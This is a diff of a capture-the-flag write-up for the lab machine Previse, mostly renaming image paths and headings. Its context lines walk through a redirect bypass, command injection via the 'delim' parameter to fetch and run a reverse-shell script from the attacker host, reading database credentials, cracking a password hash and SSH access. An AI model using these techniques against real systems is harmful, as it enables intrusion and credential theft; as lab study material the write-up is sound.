@@ -9,9 +9,9 @@ tags:
 - command-injection
 ---
 
-![Previse](/Previse.png)
+![Previse](/htb-previse.png)
 
-## Scanning & Enumeration
+## Scanning
 ### nmap
 Started with an `nmap` scan:
 * TCP all ports
@@ -56,7 +56,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ## Enumeration
 ### Web Page
 Opening up the web page it looks to be a generic Login form for a File Storage site. The login.php shows that the site is running on PHP.
-![](/previse-login_page.png)
+![](/htb-previse-login_page.png)
 ### gobuster
 When navigating to the web page it shows that that PHP is being used so that can be added to an extension type for the directory busting.
 ```bash
@@ -80,29 +80,29 @@ kali@kali:~/ctf/htb/machines/previse$ sudo gobuster dir -u http://10.10.11.104/ 
 Looks like a lot of files are redirecting back to the login.php page hinting at needing credentials.
 ### /nav.php page
 On the nav.php page, each link can be intercepted using Burp Suite, to see what can be done with the requests.
-![](/previse-nav_page.png)
+![](/htb-previse-nav_page.png)
 When selecting the CREATE ACCOUNT link, the below request is made:
-![](/previse-accounts_get.png)
+![](/htb-previse-accounts_get.png)
 When intercepting the response to this request, there is a 302 response is returned and some page data can be seen.
-![](/previse-accounts_302.png)
+![](/htb-previse-accounts_302.png)
 Modifying the 302 to a 200, allows access to account.php where a new account can be created.
-![](/previse-accounts_200.png)
+![](/htb-previse-accounts_200.png)
 ### /accounts.php
-![](/previse-accounts_page.png)
+![](/htb-previse-accounts_page.png)
 After creating a new account, and then logging into that account, additional enumeration can be done.
 ### /status.php
 The status.php page reveals that the web site is using a MySQL server, that there are two registered admins, and one file has been uploaded.
-![](/previse-status_page.png)
+![](/htb-previse-status_page.png)
 ### /files.php
 The files.php page shows an upload field and the file that have been uploaded.
-![](/previse-files_page.png)
+![](/htb-previse-files_page.png)
 After downloading and extracting the SITEBACKUP.ZIP file a new page called file_logs.php is identified.
 ### /file_logs.php
 When navigating to that page log data can be requested where the file delimiter can be specified from a drop down.
 ![](/previse-file_logs_page.png)
 After selecting SUBMIT and intercepting the request, the below request is captured, with a `delim` variable and parameter set.
 ![](/previse-logs_page.png)
-## Command Injection
+## Exploitation (Command Injection)
 When testing for command injection against the `delim` parameter it is possible to send a request from the target machine.
 ### Python Web Server
 Started a web server to try an catch a request from the target.
@@ -112,7 +112,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 ### Burp request
 Modifying the request to send a `curl` request to our attack machine.
-![](/previse-ci_burp_req.png)
+![](/htb-previse-ci_burp_req.png)
 And it can be seen that the request is made to the Python web server.
 ```bash
 kali@kali:~/ctf/htb/machines/previse/siteBackup1$ python3 -m http.server
@@ -132,7 +132,7 @@ kali@kali:~/ctf/htb/machines/previse$ nc -lvnp 4444
 listening on [any] 4444 ...
 ```
 Modify the Burp request again to download and execute the revshell.sh file
-![](/previse-ci_shell_burp_req.png)
+![](/htb-previse-ci_shell_burp_req.png)
 And a reverse shell is returned as the www-data user:
 ```bash
 connect to [10.10.14.5] from (UNKNOWN) [10.10.11.104] 49900
@@ -149,8 +149,9 @@ Shell upgrade:
 www-data@previse:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@previse:/var/www/html$ export TERM=xterm
 ```
-## m4lwhere user
-### Database
+## Privilege Escalatoin
+### m4lwhere user
+#### Database
 Looking in the config.php file there are credentials to a database:
 ```bash
 www-data@previse:/var/www/html$ cat config.php  
@@ -203,14 +204,14 @@ mysql> select * from accounts;
 ```
 The database shows a couple accounts, including m4lwhere, who is the only user on the machine.
 Now to crack the password hash for the m4lwhere user.
-### Password Crack
+#### Password Crack
 Copying the hash to a file called hash.txt and running `hashcat` against it to crack it. The password looks to be a md5crypt (based on https://hashcat.net/wiki/doku.php?id=example_hashes)
 ```bash
 kali@kali:~/ctf/htb/machines/previse$ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
 ...
 $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
 ```
-### SSH
+#### SSH
 Now with the cracked password hash, the m4lwhere user can be logged into over SSH.
 ```bash
 kali@kali:~/ctf/htb/machines/previse$ ssh m4lwhere@10.10.11.104
@@ -248,8 +249,8 @@ previse
 m4lwhere@previse:~$ cat user.txt 
 652e288e09fd164a...
 ```
-## root
-### sudo -l
+### root
+#### sudo -l
 Checking the sudo privileges the m4lwhere has:
 ```bash
 m4lwhere@previse:~$ sudo -l
